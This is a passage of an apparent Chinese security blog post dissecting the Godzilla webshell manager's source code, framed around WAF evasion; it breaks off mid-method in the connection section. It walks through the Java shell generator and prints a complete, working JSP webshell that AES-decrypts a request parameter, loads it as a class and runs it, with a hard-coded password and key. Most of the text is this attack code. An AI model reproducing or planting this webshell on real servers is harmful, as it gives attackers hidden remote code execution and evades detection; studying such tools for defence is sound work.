<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="adbd80440b50e7c9452fa478fb7d76f2">哥斯拉源码解读+如何绕过waf检测</h1>
<h2 data-content="1" id="c6118e40b4fea04083fe1e5acdb43c30">前言</h2>
<p>一个 webshell 工具核心无疑就是三点，webshell 生成，webshell 连接，webshell 利用，那为什么哥斯拉能够在 hw 期间沸沸扬扬，这里我们拆开他的源码来简单分析</p>
<h2 data-content="1" id="3eb74f2198319efc4ffe5d779a66353e">环境搭建</h2>
<p>直接下载别人已经反编译好的源码就可以了<br/>
<a href="https://github.com/safe6Sec/ShellManageTool" target="_blank">https://github.com/safe6Sec/ShellManageTool</a></p>
<p>然后把 resource 设置为资源目录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202221947-7be8bf40-b0b8-1.png"/></p>
<h2 data-content="1" id="418bd7b4455802e4d016d39f23c42a24">webshell 生成</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202221955-811c0ca6-b0b8-1.png"/></p>
<p>可以看到哥斯拉有如下的选项<br/>
密码和 key 自定义，有效载荷就是什么类型的 webshell，然后和加密器</p>
<p>对应到代码部分<br/>
这里以 java 为例子了</p>
<div class="highlight"><pre><span></span><span class="n">shells</span><span class="o">/</span><span class="n">cryptions</span><span class="o">/</span><span class="n">JavaAes</span><span class="o">/</span><span class="n">Generate</span><span class="o">.</span><span class="na">java</span>
</pre></div>
<p>开始调试分析<br/>
首当其冲的是 GenerateShellLoder 方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">GenerateShellLoder</span><span class="o">(</span><span class="n">String</span> <span class="n">pass</span><span class="o">,</span> <span class="n">String</span> <span class="n">secretKey</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">isBin</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">template</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>

        <span class="n">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">Generate</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">"shell/java/template/"</span> <span class="o">+</span> <span class="o">(</span><span class="n">isBin</span> <span class="o">?</span> <span class="s">"raw"</span> <span class="o">:</span> <span class="s">"base64"</span><span class="o">)</span> <span class="o">+</span> <span class="s">"GlobalCode.bin"</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">globalCode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">functions</span><span class="o">.</span><span class="na">readInputStream</span><span class="o">(</span><span class="n">inputStream</span><span class="o">));</span>
        <span class="n">inputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">globalCode2</span> <span class="o">=</span> <span class="n">globalCode</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"{pass}"</span><span class="o">,</span> <span class="n">pass</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"{secretKey}"</span><span class="o">,</span> <span class="n">secretKey</span><span class="o">);</span>
        <span class="n">InputStream</span> <span class="n">inputStream2</span> <span class="o">=</span> <span class="n">Generate</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">"shell/java/template/"</span> <span class="o">+</span> <span class="o">(</span><span class="n">isBin</span> <span class="o">?</span> <span class="s">"raw"</span> <span class="o">:</span> <span class="s">"base64"</span><span class="o">)</span> <span class="o">+</span> <span class="s">"Code.bin"</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">functions</span><span class="o">.</span><span class="na">readInputStream</span><span class="o">(</span><span class="n">inputStream2</span><span class="o">));</span>
        <span class="n">inputStream2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="n">Object</span> <span class="n">selectedValue</span> <span class="o">=</span> <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showInputDialog</span><span class="o">((</span><span class="n">Component</span><span class="o">)</span> <span class="kc">null</span><span class="o">,</span> <span class="s">"suffix"</span><span class="o">,</span> <span class="s">"selected suffix"</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="o">(</span><span class="n">Icon</span><span class="o">)</span> <span class="kc">null</span><span class="o">,</span> <span class="n">SUFFIX</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span><span class="o">)</span> <span class="kc">null</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">selectedValue</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">String</span> <span class="n">suffix</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">selectedValue</span><span class="o">;</span>
        <span class="n">InputStream</span> <span class="n">inputStream3</span> <span class="o">=</span> <span class="n">Generate</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="s">"shell/java/template/shell."</span> <span class="o">+</span> <span class="n">suffix</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">template2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">functions</span><span class="o">.</span><span class="na">readInputStream</span><span class="o">(</span><span class="n">inputStream3</span><span class="o">));</span>
        <span class="n">inputStream3</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="c1">//jspx 需要处理</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">suffix</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">SUFFIX</span><span class="o">[</span><span class="mi">1</span><span class="o">]))</span> <span class="o">{</span>
            <span class="n">globalCode2</span> <span class="o">=</span> <span class="n">globalCode2</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"&lt;"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"&gt;"</span><span class="o">,</span> <span class="s">"&amp;gt;"</span><span class="o">);</span>
            <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"&lt;"</span><span class="o">,</span> <span class="s">"&amp;lt;"</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"&gt;"</span><span class="o">,</span> <span class="s">"&amp;gt;"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="c1">//判断是不是上帝模式，如果是会进行unicode编码</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">ApplicationContext</span><span class="o">.</span><span class="na">isGodMode</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">template</span> <span class="o">=</span> <span class="n">template2</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"{globalCode}"</span><span class="o">,</span> <span class="n">functions</span><span class="o">.</span><span class="na">stringToUnicode</span><span class="o">(</span><span class="n">globalCode2</span><span class="o">)).</span><span class="na">replace</span><span class="o">(</span><span class="s">"{code}"</span><span class="o">,</span> <span class="n">functions</span><span class="o">.</span><span class="na">stringToUnicode</span><span class="o">(</span><span class="n">code</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">template</span> <span class="o">=</span> <span class="n">template2</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"{globalCode}"</span><span class="o">,</span> <span class="n">globalCode2</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"{code}"</span><span class="o">,</span> <span class="n">code</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">template</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"\n"</span><span class="o">,</span> <span class="s">""</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="s">"\r"</span><span class="o">,</span> <span class="s">""</span><span class="o">).</span><span class="na">getBytes</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>首先获取薄板，是根据我们的加密器来决定的，这里选的 base64</p>
<p>内容如下</p>
<div class="highlight"><pre><span></span><span class="k">try</span> <span class="o">{</span>
    <span class="c1">// 解码传入的 base64 字符串</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">base64Decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">pass</span><span class="o">));</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>

    <span class="c1">// 如果 session 中没有 "payload" 属性，则初始化它</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">,</span> <span class="k">new</span> <span class="n">X</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">()).</span><span class="na">Q</span><span class="o">(</span><span class="n">data</span><span class="o">));</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// 如果 "payload" 已存在，则将数据存入请求参数</span>
        <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"parameters"</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

        <span class="c1">// 创建一个 ByteArrayOutputStream 对象</span>
        <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span> <span class="n">arrOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span><span class="o">();</span>

        <span class="c1">// 创建一个新的 "payload" 类实例并执行一些操作</span>
        <span class="n">Object</span> <span class="n">f</span> <span class="o">=</span> <span class="o">((</span><span class="n">Class</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)).</span><span class="na">newInstance</span><span class="o">();</span>

        <span class="c1">// 这两行代码的作用可能是执行某些方法（实际上似乎在执行一些无效的操作）</span>
        <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arrOut</span><span class="o">);</span>  <span class="c1">// 这里可能有逻辑错误，equals 方法不应该在这里使用</span>
        <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">pageContext</span><span class="o">);</span>  <span class="c1">// 这里也类似，pageContext 似乎并不相关</span>

        <span class="c1">// 使用 md5 对数据进行处理，并分段输出</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">));</span>

        <span class="c1">// 将 ByteArrayOutputStream 的内容进行 Base64 编码后写入响应</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">base64Encode</span><span class="o">(</span><span class="n">x</span><span class="o">(</span><span class="n">arrOut</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="kc">true</span><span class="o">)));</span>

        <span class="c1">// 输出 md5 后半部分</span>
        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">16</span><span class="o">));</span>
    <span class="o">}</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// 处理异常</span>
    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>  <span class="c1">// 输出异常的堆栈信息</span>
<span class="o">}</span>
</pre></div>
<p>这也是我们生成文件的模板<br/>
主要是在设置响应的内容，然后我们直接看到最后生成的 webshell 吧，因为中间就是对输入的值的一些替换</p>
<div class="highlight"><pre><span></span><span class="o">&lt;%!</span>
    <span class="c1">// 定义常量和变量</span>
    <span class="n">String</span> <span class="n">xc</span> <span class="o">=</span> <span class="s">"3c6e0b8a9c15224a"</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">pass</span> <span class="o">=</span> <span class="s">"passasd"</span><span class="o">;</span>
    <span class="n">String</span> <span class="n">md5</span> <span class="o">=</span> <span class="n">md5</span><span class="o">(</span><span class="n">pass</span> <span class="o">+</span> <span class="n">xc</span><span class="o">);</span>

    <span class="c1">// 自定义类加载器，继承 ClassLoader</span>
    <span class="kd">class</span> <span class="nc">X</span> <span class="kd">extends</span> <span class="n">ClassLoader</span> <span class="o">{</span>
        <span class="kd">public</span> <span class="nf">X</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">z</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">z</span><span class="o">);</span> <span class="c1">// 使用指定的父加载器</span>
        <span class="o">}</span>

        <span class="c1">// 自定义方法：从字节数组加载类</span>
        <span class="kd">public</span> <span class="n">Class</span> <span class="nf">Q</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">cb</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">defineClass</span><span class="o">(</span><span class="n">cb</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">cb</span><span class="o">.</span><span class="na">length</span><span class="o">);</span> <span class="c1">// 定义并返回类</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="c1">// AES 加解密方法</span>
    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">x</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">s</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">m</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">javax</span><span class="o">.</span><span class="na">crypto</span><span class="o">.</span><span class="na">Cipher</span> <span class="n">c</span> <span class="o">=</span> <span class="n">javax</span><span class="o">.</span><span class="na">crypto</span><span class="o">.</span><span class="na">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES"</span><span class="o">);</span>
            <span class="n">c</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">m</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">2</span><span class="o">,</span> <span class="k">new</span> <span class="n">javax</span><span class="o">.</span><span class="na">crypto</span><span class="o">.</span><span class="na">spec</span><span class="o">.</span><span class="na">SecretKeySpec</span><span class="o">(</span><span class="n">xc</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">"AES"</span><span class="o">));</span>
            <span class="k">return</span> <span class="n">c</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">s</span><span class="o">);</span> <span class="c1">// 执行加解密</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span> <span class="c1">// 处理异常，返回 null</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="c1">// MD5 加密方法</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">md5</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">ret</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">.</span><span class="na">MessageDigest</span> <span class="n">m</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">.</span><span class="na">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"MD5"</span><span class="o">);</span>
            <span class="n">m</span><span class="o">.</span><span class="na">update</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="mi">0</span><span class="o">,</span> <span class="n">s</span><span class="o">.</span><span class="na">length</span><span class="o">());</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">math</span><span class="o">.</span><span class="na">BigInteger</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">m</span><span class="o">.</span><span class="na">digest</span><span class="o">()).</span><span class="na">toString</span><span class="o">(</span><span class="mi">16</span><span class="o">).</span><span class="na">toUpperCase</span><span class="o">();</span> <span class="c1">// 转换为十六进制并返回</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
        <span class="k">return</span> <span class="n">ret</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="c1">// Base64 编码方法</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">base64Encode</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bs</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Class</span> <span class="n">base64</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// 使用 Java 8+ 的 Base64 编码</span>
            <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.Base64"</span><span class="o">);</span>
            <span class="n">Object</span> <span class="n">encoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getEncoder"</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">base64</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
            <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">encoder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"encodeToString"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">encoder</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">bs</span><span class="o">});</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="c1">// 使用旧版本的 Base64 编码</span>
                <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.misc.BASE64Encoder"</span><span class="o">);</span>
                <span class="n">Object</span> <span class="n">encoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
                <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">encoder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"encode"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">encoder</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">bs</span><span class="o">});</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">value</span><span class="o">;</span> <span class="c1">// 返回编码后的字符串</span>
    <span class="o">}</span>

    <span class="c1">// Base64 解码方法</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">base64Decode</span><span class="o">(</span><span class="n">String</span> <span class="n">bs</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Class</span> <span class="n">base64</span><span class="o">;</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// 使用 Java 8+ 的 Base64 解码</span>
            <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.util.Base64"</span><span class="o">);</span>
            <span class="n">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getDecoder"</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">base64</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
            <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"decode"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">decoder</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">bs</span><span class="o">});</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="c1">// 使用旧版本的 Base64 解码</span>
                <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.misc.BASE64Decoder"</span><span class="o">);</span>
                <span class="n">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
                <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"decodeBuffer"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">}).</span><span class="na">invoke</span><span class="o">(</span><span class="n">decoder</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">bs</span><span class="o">});</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">value</span><span class="o">;</span> <span class="c1">// 返回解码后的字节数组</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>

<span class="o">&lt;%</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// 从请求中获取传入的 base64 参数并进行解码</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">base64Decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">pass</span><span class="o">));</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span> <span class="c1">// 使用 AES 解密</span>

        <span class="c1">// 如果 session 中没有 payload，则加载字节码</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">,</span> <span class="k">new</span> <span class="n">X</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">()).</span><span class="na">Q</span><span class="o">(</span><span class="n">data</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="c1">// 如果 payload 存在，则继续处理</span>
            <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"parameters"</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

            <span class="c1">// 创建 ByteArrayOutputStream 用于存储数据</span>
            <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span> <span class="n">arrOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span><span class="o">();</span>

            <span class="c1">// 通过反射实例化 payload</span>
            <span class="n">Object</span> <span class="n">f</span> <span class="o">=</span> <span class="o">((</span><span class="n">Class</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)).</span><span class="na">newInstance</span><span class="o">();</span>

            <span class="c1">// 执行一些不必要的操作（这里只是防止错误的代码）</span>
            <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arrOut</span><span class="o">);</span>
            <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">pageContext</span><span class="o">);</span>

            <span class="c1">// 向响应中写入 MD5 字符串的前 16 个字符</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">16</span><span class="o">));</span>

            <span class="c1">// 将处理后的数据进行 Base64 编码并写入响应</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">base64Encode</span><span class="o">(</span><span class="n">x</span><span class="o">(</span><span class="n">arrOut</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="kc">true</span><span class="o">)));</span>

            <span class="c1">// 写入 MD5 字符串的后 16 个字符</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">16</span><span class="o">));</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 捕获异常并忽略</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
</pre></div>
<h2 data-content="1" id="fd06c9995ec6a6eb658fc417a07cd0ee">连接 webshell</h2>
<p>首先连接你生成的 webshell</p>
<p>对应的 ui 是在 testButtonClick 方法</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">testButtonClick</span><span class="o">(</span><span class="n">ActionEvent</span> <span class="n">actionEvent</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">updateTempShellEntity</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">error</span><span class="o">,</span> <span class="s">"提示"</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">error</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">shellContext</span><span class="o">.</span><span class="na">initShellOpertion</span><span class="o">())</span> <span class="o">{</span>
